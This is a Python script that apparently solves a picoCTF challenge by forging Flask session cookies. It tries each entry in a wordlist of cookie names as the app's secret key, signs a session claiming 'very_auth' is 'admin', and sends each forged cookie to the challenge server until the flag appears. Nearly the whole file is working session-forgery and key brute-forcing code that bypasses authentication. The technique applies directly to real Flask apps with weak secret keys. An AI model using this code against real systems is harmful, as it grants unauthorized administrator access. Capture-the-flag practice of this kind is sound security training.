#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests


cookies = ["snickerdoodle", "chocolate chip", "oatmeal raisin",
				 "gingersnap", "shortbread", "peanut butter", "whoopie pie",
				   "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", 
				   "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon",
					 "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", 
					 "black and white", "white chocolate macadamia"]

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

for name in cookies:
	session = {}
	session["very_auth"]="admin"
	print(name)
	cookie= encodeFlaskCookie(name, session)
	r = requests.get("http://mercury.picoctf.net:44693/display", cookies = {"session" : cookie}, allow_redirects = False)
	if "picoCTF" in r.text:
		print(r.text)
		break

if __name__=='__main__':
	sk = 'youWillNeverGuess'
	sessionDict = {u'Hello':'World'}
	cookie = encodeFlaskCookie(sk, sessionDict)
	decodedDict = decodeFlaskCookie(sk, cookie)
	assert sessionDict==decodedDict